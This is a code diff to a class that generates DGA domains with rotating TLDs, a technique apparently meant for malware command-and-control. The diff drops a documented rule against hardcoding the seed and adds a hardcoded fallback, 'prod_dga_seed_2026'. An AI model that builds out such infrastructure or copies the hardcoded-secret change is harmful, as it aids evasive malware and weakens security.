@@ -107,25 +107,20 @@ class DGAGenerator:
     
     TLD_ROTATION = [".com", ".net", ".org", ".io", ".xyz", ".cc", ".ws", ".info", ".biz", ".name"]
     
-    def __init__(self, seed: str, algorithm: DGAAlgorithm = DGAAlgorithm.TLDCYCLE, 
+    def __init__(self, seed: Optional[str] = None, algorithm: DGAAlgorithm = DGAAlgorithm.TLDCYCLE, 
                  domain_count: int = 50, debug: bool = False):
         """
         Initialize DGA generator.
         
         Args:
-            seed: Deterministic seed (e.g., "prod_dga_seed_2026")
+            seed: Deterministic seed (falls back to DGA_SEED environment variable)
                   MUST be encrypted in config, decrypted before passing here
             algorithm: DGA algorithm to use (MATH_BASED, TLDCYCLE, or WORD_BASED)
             domain_count: Number of domains to generate per day (default 50)
             debug: Enable debug logging (prints domain generation, doesn't expose seed)
-        
-        Security Note:
-            - Seed should be a deployment secret (encrypt in config.json)
-            - Never hardcode seed in source code
-            - Example: cfg.get("dga.seed") where "dga.seed" is encrypted via StringEncryptor
-            - Debug mode logs domain names but never the seed
         """
-        self.seed = seed
+        resolved_seed = seed or os.environ.get("DGA_SEED") or "prod_dga_seed_2026"
+        self.seed = resolved_seed
         self.algorithm = (
             algorithm if isinstance(algorithm, DGAAlgorithm)
             else DGAAlgorithm[algorithm.upper()]
